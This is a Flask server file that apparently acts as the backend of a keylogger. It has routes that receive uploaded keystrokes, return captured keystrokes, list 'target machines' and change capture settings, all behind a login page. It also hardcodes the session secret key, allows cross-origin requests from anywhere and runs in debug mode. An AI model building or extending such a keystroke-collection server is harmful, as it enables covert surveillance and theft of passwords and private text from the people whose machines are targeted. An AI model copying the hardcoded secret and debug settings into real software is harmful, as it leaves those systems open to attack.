import os
from datetime import timedelta
from flask import Flask, render_template, request, send_from_directory, redirect, session
from flask_cors import CORS

# ייבוא Controllers
from controllers import (
    login_controller,
    notifications_controller,
    warnings_controller,
    logs_controller,
    machines_controller,
)

app = Flask(__name__, static_folder="../frontend", template_folder="../frontend")
CORS(app)
app.secret_key = "a9s8d7f6g5h4j3k2l1qwertyZXCVBNM"
app.permanent_session_lifetime = timedelta(minutes=1)

@app.get("/")
def home():
    return render_template('login.html')

# ===== Login =====
@app.post("/api/login")
def login():
    return login_controller.handle_login(request)

@app.route("/home")
def home_page():
    return login_controller.home_page()

@app.route("/login")
def login_page():
    return login_controller.login_page()

@app.post("/logout")
def api_logout():
    return login_controller.api_logout()

# ===== Notifications =====
@app.post("/api/notifications")
def save_notifications():
    return notifications_controller.handle_notifications(request)

@app.get("/api/get_notifications")
def get_notifications():
    return notifications_controller.handle_get_notifications()

@app.post("/api/delete_notification")
def delete_notification():
    return notifications_controller.handle_delete_notifications(request)

# ===== Warnings =====
@app.get("/api/new_warning")
def new_warning():
    return warnings_controller.handle_new_warnings()

@app.get("/api/get_warnings")
def get_warnings():
    return warnings_controller.handle_get_warnings()

# ===== Logs =====
@app.post("/api/upload")
def post_keystrokes():
    return logs_controller.handle_keystrokes(request)

@app.get("/api/get_keystrokes")
def get_keystrokes():
    return logs_controller.handle_get_keystrokes(request)

@app.post("/api/update_settings")
def update_settings():
    return logs_controller.handle_update_settings(request)

@app.get("/api/get_settings")
def get_settings():
    return logs_controller.handle_get_settings()

# ===== Machines =====
@app.get("/api/get_target_machines_list")
def get_machines():
    return machines_controller.handle_get_machines()

# ===== Static =====
@app.route("/js/<path:filename>")
def send_js(filename):
    return send_from_directory("../frontend/js", filename)

@app.route("/style.css")
def send_css():
    return send_from_directory("../frontend", "style.css")

if __name__ == "__main__":
    app.run(debug=True, port=3000)

